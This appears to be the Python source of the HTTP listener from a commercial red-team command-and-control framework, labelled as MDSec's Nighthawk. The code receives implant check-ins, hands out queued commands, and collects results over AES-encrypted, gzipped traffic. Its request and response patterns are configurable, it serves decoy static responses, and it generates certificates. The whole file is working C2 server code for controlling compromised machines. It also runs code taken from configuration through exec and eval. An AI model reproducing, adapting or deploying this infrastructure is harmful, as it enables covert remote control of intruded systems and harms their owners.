# Copyright 2021 MDSec Consulting Ltd
# Use of this source code is governed by an End User License Agreement,
# details of this agreement can be found in EULA.pdf
# Nighthawk (r)

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn
from threading import Thread
from re import match, search, findall, IGNORECASE, DOTALL
from pprint import pprint
from base64 import b64decode, b64encode
from StringIO import StringIO
from uuid import UUID
import os
import ssl
import subprocess
from Crypto.Cipher import AES
from gzip import GzipFile
from StringIO import StringIO
import sys

from endpoint_base import EndpointBase
from helpers import recursiveMerge, lookupConfig

class ECommsMessageType(object):
	CHECK_CONN_STATUS = 0
	GET_COMMAND_LIST = 1
	GET_COMMAND = 2
	PUT_RESULT = 3

OPENSSL_BINARY = os.getenv("OPENSSL_BINARY") # r"c:\cygwin64\bin\openssl.exe"
CERTS_DIRECTORY = "certs"

def store_cert(listener_name, cert_props):
	cert_dir = os.path.join(os.getcwd(), CERTS_DIRECTORY)

	if not os.path.exists(cert_dir):
		os.mkdir(cert_dir)
	
	keyfile = os.path.join(cert_dir, listener_name + "_key.pem")
	
	with open(keyfile, "wb") as f:
		f.write(cert_props["key"])

	certfile = os.path.join(cert_dir, listener_name + "_cert.cer")
	
	with open(certfile, "wb") as f:
		f.write(cert_props["cert"])

	return (keyfile, certfile)

def create_cert(listener_name, key_alg="rsa:4096", cert_props = {}):
	#openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -keyout www.example.com.key  -out www.example.com.cert
	
	if not OPENSSL_BINARY or not os.path.exists(OPENSSL_BINARY):
		raise Exception("OpenSSL binary path must be configured within environment variable 'OPENSSL_BINARY'")

	cert_dir = os.path.join(os.getcwd(), CERTS_DIRECTORY)

	if not os.path.exists(cert_dir):
		os.mkdir(cert_dir)
	
	keyfile = os.path.join(cert_dir, listener_name + "_key.pem")
	certfile = os.path.join(cert_dir, listener_name + "_cert.cer")

	cert_defaults = dict()
	
	recursiveMerge(cert_defaults, {
			"C": "GB",
			"CN": "localhost",
			"L": "London",
			"O": "MDSec",
			"OU": "Red Team",
			"ST": "UK",
			"validity": 365
		})

	recursiveMerge(cert_defaults, cert_props)

	validity = cert_defaults["validity"]
	del cert_defaults["validity"]

	subject = "/C={C}/CN={CN}/L={L}/O={O}/OU={OU}/ST={ST}".format(**cert_defaults)

	with open("nul", "wb") as f:
		openssl = subprocess.Popen([
				OPENSSL_BINARY,
				"req",
				"-new",
				"-newkey",
				key_alg,
				"-days",
				str(validity),
				"-nodes",
				"-x509",
				"-subj",
				subject,
				"-keyout",
				keyfile,
				"-out",
				certfile
			], stdout=f, stderr=f)

	if openssl.wait() != 0:
		return

	return (keyfile, certfile)

def _config(path):
	return lookupConfig(HttpEndpoint.Config, path)

class HttpHandler(BaseHTTPRequestHandler):
	def __init__(self, *args, **kwargs):
		# class members
		self.__body = None
		
		# forward on to base class to serve request
		BaseHTTPRequestHandler.__init__(self, *args, **kwargs)
		return
	
	def send_response(self, code, message, protocol_version):
		# overridden so that "Server" and "Date" etc. headers are not automatically sent and protocol version can be
		# customised
		self.log_request(code)
		self.wfile.write("%s %d %s\r\n" % (protocol_version, code, message))
		return
	
	def __execute_in_namespace(self, source, execution_namespace):
		code = compile(source, "dynamic_exec", "exec")
		exec code in execution_namespace
		return
	
	def __process_substitutions(self, value):
		while True:
			# handle substitution of properties containing references to other properties:
			#	 "decode":"py-eval:decrypt(input(), '$(server.key)')"
			if "$(" not in value:
				break
			
			index_start = value.find("$(")
			index_end = value.find(")", index_start)
			if index_end == -1:
				break
			
			sub_var = value[index_start:index_end + 1]
			conf_value = _config(sub_var[2:-1])
			
			if conf_value is None:
				raise Exception("HTTP C2 configuration substitution variable %s does not exist" % sub_var)
			
			value = value.replace(sub_var, conf_value)
		
		return value
	
	def __process_dynamic(self, value, execution_namespace):
		if value.startswith("py-eval:"):
			# convert to a py-exec format dynamic property
			value = "py-exec:def output(): return " + value[8:]
		
		if value.startswith("py-exec:"):
			value = value[8:]
			self.__execute_in_namespace(value, execution_namespace)
			return execution_namespace["output"]()
		
		return value
	
	def __process_property(self, value):
		# default namespace is self which exposes the entire HttpHandler class via self
		# this allows properties like py-eval:self.date_time_string() and access to
		# the HTTP method, path, etc. used.
		return self.__process_dynamic(self.__process_substitutions(value), locals())
	
	def __match_rule_extract_captured(self, rule, value, captured_vars):
		decoders_re = r"\(\?P\<([^:>]+):([^>]+)\>"
		captured_decoders = dict(findall(decoders_re, bytes(rule)))
		
		for var_name,decoder in captured_decoders.iteritems():
			rule = rule.replace("<%s:%s>" % (var_name, decoder), "<%s>" % var_name)
		
		m = match(bytes(rule), bytes(value), IGNORECASE | DOTALL)
		if not m:
			return False
		
		if captured_vars is not None:
			for var_name,value in m.groupdict().iteritems():
				if var_name in captured_decoders:
					#decoder_name = captured_decoders[var_name]
					for decoder_name in captured_decoders[var_name].split(":"):
						decoder = eval(decoder_name, EndpointBase.EncoderNamespace)
						value = decoder(value)
				
				captured_vars.update({var_name: value})
		
		return True
	
	def __get_body(self):
		if self.__body is None:
			if not self.headers.getheader("Content-Length"):
				return
			
			content_length = int(self.headers.getheader("Content-Length"))
			self.__body = self.rfile.read(content_length)
		
		return self.__body
	
	def __match_request_extract_captured(self, match_config, captured_vars):
		if "method" in match_config:
			if not self.__match_rule_extract_captured(match_config["method"], self.command, captured_vars):
				return False
		
		if "path" in match_config:
			if not self.__match_rule_extract_captured(match_config["path"], self.path, captured_vars):
				return False
		
		if "headers" in match_config:
			for name, value in match_config["headers"].iteritems():
				if not self.headers.getheader(name):
					return False
				
				if not self.__match_rule_extract_captured(value, self.headers.getheader(name), captured_vars):
					return False
		
		if "body" in match_config:
			body = self.__get_body()
			if not self.__match_rule_extract_captured(match_config["body"], body, captured_vars):
				return False
		
		return True
	
	def __matches_request(self, match_config):
		return self.__match_request_extract_captured(match_config, None)
	
	def __extract_captured_vars(self, match_config, captured_vars):
		return self.__match_request_extract_captured(match_config, captured_vars)
	
	def __embed_variable(self, value, embed_vars):
		if not embed_vars:
			return value
		
		valuebytes = bytearray(bytes(value))
		
		for var_name,var_value in embed_vars.iteritems():
			embed_re = "<%s(:[^>]+)?>" % var_name
			
			m = search(embed_re, valuebytes)
			if m:
				if type(var_value) not in [str, bytearray]:
					raise Exception("HTTP C2 encoder trying to embed non-bytes variable (%s = %s)" % (var_name, repr(var_value)))
				
				if m.group(1):
					for encoder_name in str(m.group(1)[1:]).split(":"):
						encoder = eval(encoder_name, EndpointBase.EncoderNamespace)
						var_value = encoder(var_value)
				
				valuebytes = valuebytes.replace(bytearray(m.group(0)), bytearray(var_value))
		
		return str(valuebytes)
	
	def __send_response(self, response_config, embed_vars = None):
		self.send_response(
				response_config["status"],
				self.__embed_variable(self.__process_property(response_config["message"]), embed_vars),
				self.__embed_variable(self.__process_property(response_config["protocol-version"]), embed_vars)
			)
		
		if "headers" in response_config:
			for name,value in response_config["headers"].iteritems():
				self.send_header(name, self.__embed_variable(self.__process_property(value), embed_vars))
		
		body = None
		
		if "body" in response_config:
			body = self.__embed_variable(self.__process_property(response_config["body"]), embed_vars)
			self.send_header("Content-Length", len(body))

		self.end_headers()
		
		if body is not None:
			self.wfile.write(body)
		
		return
	
	def __get_ciphertext(self, data):
		# compress
		buf = StringIO()
		comp = GzipFile(fileobj=buf, mode="wb")
		comp.write(data)
		comp.close()
		data = buf.getvalue()

		# encrypt
		length = 16 - (len(data) % 16)
		data += chr(length)*length
		aes = AES.new(str(_config("settings.aes-128-key")), AES.MODE_CBC, str(_config("settings.aes-128-iv")))
		return aes.encrypt(data)

	def __get_plaintext(self, data, decompress):
		# decrypt
		aes = AES.new(str(_config("settings.aes-128-key")), AES.MODE_CBC, str(_config("settings.aes-128-iv")))
		data = aes.decrypt(data)
		data = data[:-ord(data[-1])]

		if not decompress:
			return data

		# decompress
		decomp = GzipFile(fileobj=StringIO(data), mode="rb")
		buf = decomp.read()
		decomp.close()
		return buf

	def __from_metadata(self, metadata):
		# PWS: now it is variable length as it contains the listener name
		#if len(metadata) != 36:
		#	raise Exception("HTTP C2 metadata malformed (should be 36 bytes, was %u)" % len(metadata))

		cmdid = ord(metadata[0])
		clientid = str(UUID(bytes_le=metadata[4:20]))
		msgid = str(UUID(bytes_le=metadata[20:36]))
		listener_name_len = ord(metadata[36])
		listener_name = metadata[37:37 + listener_name_len]
		
		return cmdid,clientid,msgid,listener_name
	
	def __is_watchdog(self):
		return self.path == "/watchdog/%s" % (EndpointBase.Secret)

	def __handle_watchdog(self):
		self.send_response(200, "OK", "HTTP/1.1")
		self.send_header("Content-Type", "text/plain")
		self.end_headers()
		self.wfile.write("WATCHDOG")
		return

	def __handle_request(self):
		if self.__is_watchdog():
			self.__handle_watchdog()
			return

		matched_cmds = filter(lambda cmd : self.__matches_request(cmd[1]["match-request"]),
				_config("commands").iteritems()
			)
		
		if not matched_cmds:
			# treat as a static response
			matched_static = filter(lambda sr : self.__matches_request(sr["match-request"]),
					_config("static-responses")
				)
			
			if not matched_static:
				raise Exception("HTTP C2 no catch-all static response handler for method %s" % self.command)
			
			# go with matched_static[0] as this is the most specific
			self.__send_response(matched_static[0]["response"])
			return
		
		# otherwise handle the c2 command
		captured_vars = dict()
		
		if not self.__extract_captured_vars(matched_cmds[0][1]["match-request"], captured_vars):
			raise Exception("HTTP C2 variable extraction failed for command type %s" % matched_cmds)
		
		result = None

		for cmd_name,cmd_info in matched_cmds:
			handler = eval("self._HttpHandler__handle_%s" % cmd_name)
			result = handler(captured_vars)
			if result:
				break

		if not result:
			raise Exception("HTTP C2 request matched C2 commands %s but was malformed" % ", ".join([cmd[0] for cmd in matched_cmds]))

		response_config,embed_vars = result
		self.__send_response(response_config, embed_vars)
		return

	def __handle_status(self, captured_vars):
		cmd_id,clientid,msgid,listener_name = self.__from_metadata(self.__get_plaintext(captured_vars["metadata"], False))
		if cmd_id != ECommsMessageType.CHECK_CONN_STATUS:
			return

		status_code, r = HttpEndpoint.ApiClient.c2_status()
		return _config("commands.status.response-success"),{}
	
	def __handle_listcommands(self, captured_vars):
		cmd_id,clientid,msgid,listener_name = self.__from_metadata(self.__get_plaintext(captured_vars["metadata"], False))
		if cmd_id != ECommsMessageType.GET_COMMAND_LIST:
			return

		# notify API server of client activity (recorded from here so client IP is preserved)
		HttpEndpoint.ApiClient.c2_notifyactivity(clientid, listener_name, self.client_address[0])
		
		status_code, command_list = HttpEndpoint.ApiClient.c2_listcommands(clientid)
		
		if status_code != 200:
			return _config("commands.listcommands.response-error"),{}
		
		return (
				_config("commands.listcommands.response-success"),
				{"payload": self.__get_ciphertext("\r\n".join([str(cmd_id) for cmd_id in command_list]) + "\r\n")}
			)
	
	def __handle_getcommand(self, captured_vars):
		cmd_id,clientid,msgid,listener_name = self.__from_metadata(self.__get_plaintext(captured_vars["metadata"], False))
		if cmd_id != ECommsMessageType.GET_COMMAND:
			return

		status_code, command = HttpEndpoint.ApiClient.c2_getcommand(msgid)
		
		if status_code != 200:
			return _config("commands.getcommand.response-error"),{}
		
		return (
				_config("commands.getcommand.response-success"),
				{"payload": self.__get_ciphertext(b64decode(command["payload"]))}
			)
	
	def __handle_putresult(self, captured_vars):
		cmd_id,clientid,msgid,listener_name = self.__from_metadata(self.__get_plaintext(captured_vars["metadata"], False))
		if cmd_id != ECommsMessageType.PUT_RESULT:
			return

		payload = self.__get_plaintext(captured_vars["payload"], True)

		status_code, r = HttpEndpoint.ApiClient.c2_putresult(
				clientid,
				msgid,
				{"payload": b64encode(payload)}
			)
		
		if status_code != 200:
			return _config("commands.putresult.response-error"),{}
		
		return (
				_config("commands.putresult.response-success"),{}
			)
	
	# TODO: add do_XXX() for all HTTP methods we will support
	def do_HEAD(self):
		self.__handle_request()
		return
	
	def do_GET(self):
		self.__handle_request()
		return
	
	def do_POST(self):
		self.__handle_request()
		return
	
	def do_PUT(self):
		self.__handle_request()
		return
	
	def do_DELETE(self):
		self.__handle_request()
		return
	
	def do_OPTIONS(self):
		self.__handle_request()
		return

class HttpdWorker(Thread):
	def __init__(self, httpd):
		super(HttpdWorker, self).__init__()
		self.__httpd = httpd
		return
	
	def run(self):
		self.__httpd.serve_forever()
		return

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
	pass

class HttpEndpoint(EndpointBase):
	def __init__(self, *args, **kwargs):
		super(HttpEndpoint, self).__init__(*args, **kwargs)
		
		# merge command defaults with commands in config
		for name,value in _config("commands").iteritems():
			merged_config = dict()
			recursiveMerge(merged_config, _config("command-defaults"))
			recursiveMerge(merged_config, value)
			_config("commands")[name] = merged_config
		
		# class variables
		exec "import builtinencoders" in EndpointBase.EncoderNamespace
		exec "from builtinencoders import *" in EndpointBase.EncoderNamespace
		
		encoders = _config("code-modules.encoders")
		for encoder in encoders:
			if encoder["type"] == "python-script" and encoder["version"] == "2.7":
				code = encoder["code"]
				exec code in EndpointBase.EncoderNamespace
		
		# member variables
		self.__httpd = None
		self.__worker = None
		return
	
	def start(self):
		# overridden to allow reasonable StreamRequestHandler socket timeout
		HttpHandler.timeout = _config("settings.timeout")
		ThreadedHTTPServer.allow_reuse_address = 0 # only one python process can bind the socket
		
		self.__httpd = ThreadedHTTPServer(
				(_config("settings.ip"), _config("settings.port")),
				HttpHandler
			)
		
		# https settings
		if _config("settings.ssl.enabled") == True:
			if _config("settings.ssl.mode") == "create":
				keyfile,certfile = create_cert(HttpEndpoint.ListenerName, cert_props = _config("settings.ssl.cert"))
			elif _config("settings.ssl.mode") == "store":
				keyfile,certfile = store_cert(HttpEndpoint.ListenerName, _config("settings.ssl.cert"))
			else:
				raise Exception("Config setting settings.ssl.mode must be 'create' or 'store'")
			self.__httpd.socket = ssl.wrap_socket(self.__httpd.socket,keyfile=keyfile, certfile=certfile, server_side=True)
		
		self.__worker = HttpdWorker(self.__httpd)
		return self.__worker.start()
	
	def stop(self):
		self.__httpd.shutdown()
		self.__worker.join()
		return

def Endpoint(*args, **kwargs):
	return HttpEndpoint(*args, **kwargs)